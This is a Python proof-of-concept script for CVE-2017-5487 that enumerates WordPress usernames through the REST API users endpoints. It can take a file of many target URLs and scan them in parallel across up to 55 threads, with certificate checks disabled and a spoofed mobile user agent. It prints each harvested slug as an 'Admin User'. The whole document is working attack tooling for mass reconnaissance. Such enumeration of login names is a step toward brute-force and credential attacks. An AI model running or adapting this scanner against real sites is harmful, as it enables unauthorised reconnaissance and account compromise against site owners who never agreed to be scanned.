#!/bin/python3
import time
import requests
import argparse
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from alive_progress import alive_bar

# Disable warnings for insecure requests
disable_warnings(InsecureRequestWarning)
user_agent = {'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16'}

def fetch_wordpress_users(target_url):
    wordpress_api_endpoints = [
        "?rest_route=/wp/v2/users/",
        "wp-json/wp/v2/users/",
    ]

    for endpoint in wordpress_api_endpoints:
        url = f"{target_url}{endpoint}"
        print(f'url {url}')
        response = requests.get(url, timeout=7, headers=user_agent, verify=False, allow_redirects=False)
        response_text = response.text
        print(response.text)
        if response.status_code == 200:
            user_data = response.json()
            if user_data:
                for user in user_data:
                    print(f"[+] Admin User:{user['slug']}")
    return

def process_file(file):
    try:
        with open(file, 'r') as url_file:
            urls = [url.strip() for url in url_file]
            if not urls:
                print("[ERROR] No targets found in the file.")
                return

            print(f"[!] Scanning {len(urls)} targets in {file}\n")

            start_time = time.time()
            completed_tasks = []
            failed_tasks = []

            with alive_bar(len(urls), title='Scanning Targets', bar='classic', enrich_print=False) as bar:
                with ThreadPoolExecutor(max_workers=55) as executor:
                    future_to_url = {executor.submit(fetch_wordpress_users, url): url for url in urls}
                    for future in concurrent.futures.as_completed(future_to_url):
                        url = future_to_url[future]
                        try:
                            future.result()
                            completed_tasks.append(url)
                        except Exception:
                            failed_tasks.append(url)
                        bar()

            end_time = time.time()
            elapsed_time = end_time - start_time

            print("\n[!] Finished scanning {} out of {} targets.".format(len(completed_tasks), len(urls)))
            print("[!] Elapsed Time: {:.2f} seconds".format(elapsed_time))

    except FileNotFoundError:
        print("[ERROR] That file does not exist.")
        exit()

def main():
    parser = argparse.ArgumentParser(description='A PoC for CVE-2017-5487 - WordPress user enumeration')
    parser.add_argument('-u', '--url', help='Target URL of the WordPress site to gather usernames')
    parser.add_argument('-f', '--file', help='File containing URLs to gather usernames')
    args = parser.parse_args()

    if args.url:
        target_url = args.url
        print(f"[!] Scanning target URL {target_url}\n")
        fetch_wordpress_users(target_url)
    elif args.file:
        file = args.file
        process_file(file)

if __name__ == "__main__":
    main()
